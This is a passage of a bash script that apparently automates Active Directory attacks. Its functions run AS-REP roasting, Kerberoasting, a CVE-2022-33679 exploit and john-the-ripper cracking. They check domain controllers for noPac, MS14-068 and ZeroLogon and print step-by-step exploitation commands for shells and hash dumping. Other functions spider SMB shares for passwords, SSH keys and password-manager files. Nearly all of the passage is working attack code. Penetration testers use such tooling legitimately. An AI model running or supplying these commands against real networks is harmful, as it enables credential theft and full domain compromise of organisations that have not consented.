>\"${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt\"\n            grep \"krb5asrep\" \"${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt\" | sed \"s/\\$krb5asrep\\$23\\$//\" >\"${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt\" 2>&1\n        else\n            run_command \"${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}\"\n            run_command \"${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}\" >\"${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt\"\n            #${netexec} ${ne_verbose} smb ${servers_smb_list} \"${argument_ne}\" --asreproast --log ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt\" 2>&1\n        fi\n        if grep -q 'error' \"${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt\"; then\n            echo -e \"${RED}[-] Errors during AS REP Roasting Attack... ${NC}\"\n        else\n            grep \"krb5asrep\" \"${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt\" | sed \"s/\\$krb5asrep\\$23\\$//\" | tee \"${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt\" 2>&1\n            if [ -s \"${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt\" ]; then\n                echo -e \"${GREEN}[+] ASREP-roastable accounts found!${NC}\"\n            else\n                echo -e \"${PURPLE}[-] No ASREP-roastable accounts found${NC}\"\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nasreprc4_attack() {\n    if [ ! -f \"${CVE202233679}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of CVE-2022-33679.py${NC}\"\n    else\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${BLUE}[*] CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)${NC}\"\n            if [ ! -f \"${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt\" ]; then\n                asrep_attack\n            fi\n            asrep_user=$(cut -d \"@\" -f 1 \"${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt\" | head -n 1)\n            if [ ! \"${asrep_user}\" == \"\" ]; then\n                current_dir=$(pwd)\n                cd \"${output_dir}/Credentials\" || exit\n                run_command \"${python3} ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}\" 2>&1 | tee \"${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt\"\n                cd \"${current_dir}\" || exit\n            else\n                echo -e \"${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}\"\n            fi\n        else\n            echo -e \"${PURPLE}[-] CVE-2022-33679 skipped (credentials provided)${NC}\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nkerberoast_attack() {\n    if [ ! -f \"${impacket_GetUserSPNs}\" ]; then\n        echo -e \"${RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket${NC}\"\n    else\n        if [[ \"${dc_domain,,}\" != \"${domain,,}\" ]] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${BLUE}[*] Blind Kerberoasting Attack${NC}\"\n            asrep_user=$(cut -d \"@\" -f 1 \"${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt\" | head -n 1)\n            if [ ! \"${asrep_user}\" == \"\" ]; then\n                run_command \"${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${dc_domain}\" >\"${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt\"\n                if grep -q 'error' \"${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt\"; then\n                    echo -e \"${RED}[-] Errors during Blind Kerberoast Attack... ${NC}\"\n                else\n                    grep \"krb5tgs\" \"${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt\" | sed \"s/\\$krb5tgs\\$/:\\$krb5tgs\\$/\" | awk -F \"\\$\" -v OFS=\"\\$\" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\\*\\$:/:/' | tee \"${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt\"\n                fi\n            else\n                echo -e \"${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. Run ASREPRoast attack and try again.${NC}\"\n            fi\n        else\n            echo -e \"${BLUE}[*] Kerberoast Attack${NC}\"\n            run_command \"${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}\" | tee \"${output_dir}/Kerberos/kerberoast_list_output_${dc_domain}.txt\"\n            run_command \"${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}\" >\"${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt\"\n            #${netexec} ${ne_verbose} smb ${servers_smb_list} \"${argument_ne}\" --kerberoasting --log ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt\" 2>&1\n            if grep -q 'error' \"${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt\"; then\n                echo -e \"${RED}[-] Errors during Kerberoast Attack... ${NC}\"\n            else\n                grep \"krb5tgs\" \"${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt\" | sed \"s/\\$krb5tgs\\$/:\\$krb5tgs\\$/\" | awk -F \"\\$\" -v OFS=\"\\$\" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\\*\\$:/:/' >\"${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt\"\n                grep \"MSSQLSvc\" \"${output_dir}/Kerberos/kerberoast_list_output_${dc_domain}.txt\" | cut -d '/' -f 2 | cut -d ':' -f 1 | cut -d ' ' -f 1 | sort -u >\"${output_dir}/DomainRecon/Servers/sql_list_kerberoast_${dc_domain}.txt\"\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nkrbjack_attack() {\n    if [ ! -f \"${krbjack}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of krbjack${NC}\"\n    else\n        echo -e \"${BLUE}[*] Checking for DNS unsecure updates using krbjack${NC}\"\n        run_command \"${krbjack} check --dc-ip ${dc_ip} --domain ${domain}\" 2>&1 | tee \"${output_dir}/Kerberos/krbjack_output_${dc_domain}.txt\"\n        if ! grep -q 'This domain IS NOT vulnerable' \"${output_dir}/Kerberos/krbjack_output_${dc_domain}.txt\"; then\n            echo -e \"${GREEN}[+] DNS unsecure updates possible! Follow steps below to abuse the vuln and perform AP_REQ hijacking:${NC}\"\n            echo -e \"${krbjack} run --dc-ip ${dc_ip} --target-ip ${dc_ip} --domain ${domain} --target-name ${dc_NETBIOS} --ports 139,445 --executable <PATH_TO_EXECUTABLE_TO_RUN>\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nkerborpheus_attack() {\n    if [ ! -f \"${orpheus}\" ]; then\n        echo -e \"${RED}[-] orpheus.py not found! Please verify the installation of orpheus${NC}\"\n    else\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] orpheus requires credentials${NC}\"\n        else\n            echo -e \"${BLUE}[*] Kerberoast Attack using Orpheus${NC}\"\n            current_dir=$(pwd)\n            cd \"${scripts_dir}/orpheus-main\" || exit\n            echo \"$(date +%Y-%m-%d\\ %H:%M:%S); ${orpheus} | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt\" >>\"$command_log\"\n            (\n                echo -e \"cred ${argument_imp}\\ndcip ${dc_ip}\\nfile ${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt\\n enc 18\\n hex 0x40AC0010\"\n                cat /dev/tty\n            ) | /usr/bin/script -qc \"${python3} ${orpheus}\" /dev/null | tee -a \"${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt\"\n            cd \"${current_dir}\" || exit\n        fi\n    fi\n    echo -e \"\"\n}\n\nnopac_check() {\n    echo -e \"${BLUE}[*] NoPac (CVE-2021-42278 and CVE-2021-42287) check ${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] netexec's nopac does not support kerberos authentication${NC}\"\n    else\n        run_command \"${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M nopac --log ${output_dir}/Kerberos/ne_nopac_output_${dc_domain}.txt\" 2>&1\n        if grep -q \"VULNERABLE\" \"${output_dir}/Kerberos/ne_nopac_output_${dc_domain}.txt\"; then\n            echo -e \"${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}\" | tee -a \"${output_dir}/Kerberos/noPac_exploitation_steps_${dc_domain}.txt\"\n            echo -e \"${CYAN}# Get shell:${NC}\" | tee -a \"${output_dir}/Kerberos/noPac_exploitation_steps_${dc_domain}.txt\"\n            echo -e \"noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]\" | tee -a \"${output_dir}/Kerberos/noPac_exploitation_steps_${dc_domain}.txt\"\n            echo -e \"${CYAN}# Dump hashes:${NC}\" | tee -a \"${output_dir}/Kerberos/noPac_exploitation_steps_${dc_domain}.txt\"\n            echo -e \"noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]\" | tee -a \"${output_dir}/Kerberos/noPac_exploitation_steps_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nms14-068_check() {\n    echo -e \"${BLUE}[*] MS14-068 check ${NC}\"\n    if [ ! -f \"${impacket_goldenPac}\" ]; then\n        echo -e \"${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}\"\n    else\n        if [ \"${nullsess_bool}\" == true ] || [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] MS14-068 requires credentials and does not support Kerberos authentication${NC}\"\n        else\n            run_command \"${impacket_goldenPac} ${argument_imp_gp}\\\\@${dc_FQDN} None -target-ip ${dc_ip}\" 2>&1 | tee \"${output_dir}/Kerberos/ms14-068_output_${dc_domain}.txt\"\n            if grep -q \"found vulnerable\" \"${output_dir}/Kerberos/ms14-068_output_${dc_domain}.txt\"; then\n                echo -e \"${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}\" | tee -a \"${output_dir}/Kerberos/ms14-068_exploitation_steps_${dc_domain}.txt\"\n                echo -e \"${CYAN}# Execute command below to get shell:${NC}\" | tee -a \"${output_dir}/Kerberos/ms14-068_exploitation_steps_${dc_domain}.txt\"\n                echo -e \"${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}\" | tee -a \"${output_dir}/Kerberos/ms14-068_exploitation_steps_${dc_domain}.txt\"\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nraise_child() {\n    if [ ! -f \"${impacket_raiseChild}\" ]; then\n        echo -e \"${RED}[-] raiseChild.py not found! Please verify the installation of impacket ${NC}\"\n    elif [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] raiseChild requires credentials${NC}\"\n    else\n        echo -e \"${BLUE}[*] Running privilege escalation from Child Domain to Parent Domain using raiseChild${NC}\"\n        run_command \"${impacket_raiseChild} ${argument_imp} -w ${output_dir}/Credentials/raiseChild_ccache_${dc_domain}.txt\" 2>&1 | tee -a \"${output_dir}/Kerberos/impacket_raiseChild_output.txt\"\n    fi\n    echo -e \"\"\n}\n\njohn_crack_asrep() {\n    if [ ! -f \"${john}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of john${NC}\"\n    else\n        echo -e \"${BLUE}[*] Cracking found hashes using john the ripper${NC}\"\n        if [ ! -s \"${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt\" ]; then\n            echo -e \"${PURPLE}[-] No accounts with Kerberos preauth disabled found${NC}\"\n        else\n            echo -e \"${YELLOW}[i] Using $pass_wordlist wordlist...${NC}\"\n            echo -e \"${CYAN}[*] Launching john on collected asreproast hashes. This may take a while...${NC}\"\n            echo -e \"${YELLOW}[i] Press CTRL-C to abort john...${NC}\"\n            run_command \"$john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_wordlist\"\n            echo -e \"${GREEN}[+] Printing cracked AS REP Roast hashes...${NC}\"\n            run_command \"$john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show\" | tee \"${output_dir}/Kerberos/asreproast_john_results_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\njohn_crack_kerberoast() {\n    if [ ! -f \"${john}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of john${NC}\"\n    else\n        echo -e \"${BLUE}[*] Cracking found hashes using john the ripper${NC}\"\n        if [ ! -s \"${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt\" ] && [ ! -s \"${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt\" ]; then\n            echo -e \"${PURPLE}[-] No SPN accounts found${NC}\"\n        else\n            echo -e \"${YELLOW}[i] Using $pass_wordlist wordlist...${NC}\"\n            echo -e \"${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}\"\n            echo -e \"${YELLOW}[i] Press CTRL-C to abort john...${NC}\"\n            run_command \"$john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_wordlist\"\n            echo -e \"${GREEN}[+] Printing cracked Kerberoast hashes...${NC}\"\n            run_command \"$john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show\" | tee \"${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\n###### scan_shares: Shares scan\nsmb_map() {\n    if [ ! -f \"${smbmap}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of smbmap${NC}\"\n    else\n        mkdir -p \"${output_dir}/Shares/smbmapDump\"\n        echo -e \"${BLUE}[*] SMB shares Scan using smbmap${NC}\"\n        if [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] smbmap does not support Kerberos authentication${NC}\"\n        else\n            smb_scan\n            echo -e \"${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}\"\n            for i in $(grep -v ':' \"${servers_smb_list}\"); do\n                echo -e \"${CYAN}[*] Listing shares on ${i} ${NC}\"\n                run_command \"${smbmap} -H $i ${argument_smbmap}\" | grep -v \"Working on it...\" >\"${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt\"\n                if [ \"${nullsess_bool}\" == true ]; then\n                    echo -e \"${CYAN}[*] smbmap enumeration (Guest and random user)${NC}\"\n                    run_command \"${smbmap} -H $i -u 'Guest' -p ''\" | grep -v \"Working on it...\" >>\"${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt\"\n                    run_command \"${smbmap} -H $i -u ${rand_user} p ''\" | grep -v \"Working on it...\" >>\"${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt\"\n                fi\n            done\n\n            grep -iaH READ \"${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_*.txt\" 2>&1 | grep -v 'prnproc\\$\\|IPC\\$\\|print\\$\\|SYSVOL\\|NETLOGON' | sed \"s/\\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g\" | rev | cut -d \"/\" -f 1 | rev | awk -F \" \" '{print $1 \";\"  $2 \";\" $3}' >\"${output_dir}/Shares/all_network_shares_${dc_domain}.csv\"\n            grep -iaH READ \"${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_*.txt\" 2>&1 | grep -v 'prnproc\\$\\|IPC\\$\\|print\\$\\|SYSVOL\\|NETLOGON' | sed \"s/\\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g\" | rev | cut -d \"/\" -f 1 | rev | awk -F \" \" '{print \"\\\\\\\\\" $1 \"\\\\\" $2}' >\"${output_dir}/Shares/all_network_shares_${dc_domain}.txt\"\n\n            echo -e \"${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}\"\n            for i in $(grep -v ':' \"${servers_smb_list}\"); do\n                echo -e \"${CYAN}[*] Listing files in accessible shares on ${i} ${NC}\"\n                current_dir=$(pwd)\n                mkdir -p \"${output_dir}/Shares/smbmapDump/${i}\"\n                cd \"${output_dir}/Shares/smbmapDump/${i}\" || exit\n                run_command \"${smbmap} -H $i ${argument_smbmap} -A '\\.cspkg|\\.publishsettings|\\.xml|\\.json|\\.ini|\\.bat|\\.log|\\.pl|\\.py|\\.ps1|\\.txt|\\.config|\\.conf|\\.cnf|\\.sql|\\.yml|\\.cmd|\\.vbs|\\.php|\\.cs|\\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'\" | grep -v \"Working on it...\" >\"${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt\"\n                if [ \"${nullsess_bool}\" == true ]; then\n                    echo -e \"${CYAN}[*] smbmap enumeration (Guest and random user)${NC}\"\n                    run_command \"${smbmap} -H $i -u 'Guest' -p '' -A '\\.cspkg|\\.publishsettings|\\.xml|\\.json|\\.ini|\\.bat|\\.log|\\.pl|\\.py|\\.ps1|\\.txt|\\.config|\\.conf|\\.cnf|\\.sql|\\.yml|\\.cmd|\\.vbs|\\.php|\\.cs|\\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'\" | grep -v \"Working on it...\" >>\"${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt\"\n                    run_command \"${smbmap} -H $i -u ${rand_user} -p '' -A '\\.cspkg|\\.publishsettings|\\.xml|\\.json|\\.ini|\\.bat|\\.log|\\.pl|\\.py|\\.ps1|\\.txt|\\.config|\\.conf|\\.cnf|\\.sql|\\.yml|\\.cmd|\\.vbs|\\.php|\\.cs|\\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'\" | grep -v \"Working on it...\" >>\"${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt\"\n                fi\n                cd \"${current_dir}\" || exit\n            done\n        fi\n    fi\n    echo -e \"\"\n}\n\nne_shares() {\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    echo -e \"${BLUE}[*] Enumerating Shares using netexec ${NC}\"\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --shares --log ${output_dir}/Shares/ne_shares_output_${dc_domain}.txt\" 2>&1\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${BLUE}[*] Enumerating Shares using netexec (Guest and random user)${NC}\"\n        run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} -u Guest -p '' --shares --log ${output_dir}/Shares/ne_shares_nullsess_output_${dc_domain}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} -u ${rand_user} -p '' --shares --log ${output_dir}/Shares/ne_shares_nullsess_output_${dc_domain}.txt\" 2>&1\n    fi\n\n    echo -e \"\"\n}\n\nne_spider() {\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    echo -e \"${BLUE}[*] Spidering Shares using netexec ${NC}\"\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_output_${dc_domain}.txt\" 2>&1\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${BLUE}[*] Spidering Shares using netexec (Guest and random user)${NC}\"\n        run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} -u Guest -p '' -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_nullsess_output_${dc_domain}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} -u ${rand_user} -p '' -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_nullsess_output_${dc_domain}.txt\" 2>&1\n    fi\n    echo -e \"\"\n}\n\nfinduncshar_scan() {\n    if [ ! -f \"${FindUncommonShares}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of FindUncommonShares${NC}\"\n    else\n        echo -e \"${BLUE}[*] Enumerating Shares using FindUncommonShares${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] FindUncommonShares requires credentials ${NC}\"\n        else\n            smb_scan\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--ldaps\"; else ldaps_param=\"\"; fi\n            if [ \"${verbose_bool}\" == true ]; then verbose_p0dalirius=\"-v --debug\"; else verbose_p0dalirius=\"\"; fi\n            run_command \"${python3} ${FindUncommonShares} ${argument_FindUncom} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${servers_smb_list} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx --kdcHost ${dc_FQDN}\" 2>&1 | tee -a \"${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nmanspider_scan() {\n    echo -e \"${BLUE}[*] Spidering Shares using manspider ${NC}\"\n    if [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] manspider does not support Kerberos authentication${NC}\"\n    else\n        mkdir -p \"${output_dir}/Shares/manspiderDump\"\n        echo -e \"${CYAN}[*] Running manspider....${NC}\"\n        smb_scan\n        echo -e \"${CYAN}[*] Searching for files with interesting filenames${NC}\"\n        run_command \"${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f passw user admin account network login key logon cred -l ${output_dir}/Shares/manspiderDump\" 2>&1 | tee -a \"${output_dir}/Shares/manspider_output_${dc_domain}.txt\"\n        echo -e \"${CYAN}[*] Searching for SSH keys${NC}\"\n        run_command \"${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -l ${output_dir}/Shares/manspiderDump\" 2>&1 | tee -a \"${output_dir}/Shares/manspider_output_${dc_domain}.txt\"\n        echo -e \"${CYAN}[*] Searching for files with interesting extensions${NC}\"\n        run_command \"${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml cspkg publishsettings json cnf sql cmd -l ${output_dir}/Shares/manspiderDump\" 2>&1 | tee -a \"${output_dir}/Shares/manspider_output_${dc_domain}.txt\"\n        echo -e \"${CYAN}[*] Searching for Password manager files${NC}\"\n        run_command \"${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -l ${output_dir}/Shares/manspiderDump\" 2>&1 | tee -a \"${output_dir}/Shares/manspider_output_${dc_domain}.txt\"\n        echo -e \"${CYAN}[*] Searching for word passw in documents${NC}\"\n        run_command \"${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -c passw login -e docx xlsx xls pdf pptx csv -l ${output_dir}/Shares/manspiderDump\" 2>&1 | tee -a \"${output_dir}/Shares/manspider_output_${dc_domain}.txt\"\n        echo -e \"${CYAN}[*] Searching for words in downloaded files${NC}\"\n        run_command \"${manspider} ${output_dir}/Shares/manspiderDump -q -t 100 -c passw key login -l ${output_dir}/Shares/manspiderDump\" 2>&1 | tee -a \"${output_dir}/Shares/manspider_output_${dc_domain}.txt\"\n        echo -e \"\"\n    fi\n}\n\nsmbclient_console() {\n    if [ ! -f \"${impacket_smbclient}\" ]; then\n        echo -e \"${RED}[-] smbclient.py not found! Please verify the installation of impacket ${NC}\"\n    else\n        echo -e \"${BLUE}[*] Please specify target IP or hostname:${NC}\"\n        echo -e \"${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}\"\n        read -rp \">> \" smbclient_target </dev/tty\n        while [ \"${smbclient_target}\" == \"\" ]; do\n            echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n            read -rp \">> \" smbclient_target </dev/tty\n        done\n        echo -e \"${BLUE}[*] Opening smbclient.py console on target: $smbclient_target ${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            run_command \"${impacket_smbclient} ${argument_imp}Guest:''\\\\@${smbclient_target}\" 2>&1 | tee -a \"${output_dir}/Shares/impacket_smbclient_output.txt\"\n        else\n            run_command \"${impacket_smbclient} ${argument_imp}\\\\@${smbclient_target}\" 2>&1 | tee -a \"${output_dir}/Shares/impacket_smbclient_output.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nsmbclientng_console() {\n    if [ ! -f \"${smbclientng}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of smbclientng${NC}\"\n    else\n        echo -e \"${BLUE}[*] Launching smbclientng${NC}\"\n        echo -e \"${BLUE}[*] Please specify target IP or hostname:${NC}\"\n        echo -e \"${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}\"\n        read -rp \">> \" smbclient_target </dev/tty\n        while [ \"${smbclient_target}\" == \"\" ]; do\n            echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n            read -rp \">> \" smbclient_target </dev/tty\n        done\n        if [ \"${verbose_bool}\" == true ]; then verbose_p0dalirius=\"--debug\"; else verbose_p0dalirius=\"\"; fi\n        run_command \"${smbclientng} ${argument_p0dalirius} ${verbose_p0dalirius} --host ${smbclient_target} --kdcHost ${dc_FQDN}\" 2>&1 | tee -a \"${output_dir}/Shares/smbclientng_output_${dc_domain}.txt\"\n    fi\n    echo -e \"\"\n}\n\n###### vuln_checks: Vulnerability checks\nzerologon_check() {\n    echo -e \"${BLUE}[*] zerologon check. This may take a while... ${NC}\"\n    run_command \"echo -n Y | ${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M zerologon --log ${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt\" 2>&1\n    if grep -q \"VULNERABLE\" \"${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt\"; then\n        echo -e \"${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}\" | tee -a \"${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt\"\n        echo -e \"${CYAN}1. Exploit the vulnerability, set the NT hash to \\\\x00*8:${NC}\" | tee -a \"${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt\"\n        echo -e \"cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip\" | tee -a \"${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt\"\n        echo -e \"${CYAN}2. Obtain the Domain Admin's NT hash:${NC}\" | tee -a \"${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt\"\n        echo -e \"secretsdump.py $dc_domain/$dc_NETBIOS\\$@$dc_ip -no-pass -just-dc-user Administrator\" | tee -a \"${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt\"\n        echo -e \"${CYAN}3. Obtain the machine account hex encoded password:${NC}\" | tee -a \"${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt\"\n        echo -e \"secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip\" | tee -a \"${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt\"\n        echo -e \"${CYAN}4. Restore the machine account password:${NC}\" | tee -a \"${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt\"\n        echo -e \"restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>\" | tee -a \"${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt\"\n    fi\n    echo -e \"\"\n}\n\nms17-010_check() {\n    echo -e \"${BLUE}[*] MS17-010 check ${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ms17-010 --log ${output_dir}/Vulnerabilities/ne_ms17-010_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\ncoerceplus_check() {\n    echo -e \"${BLUE}[*] coerce check ${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain 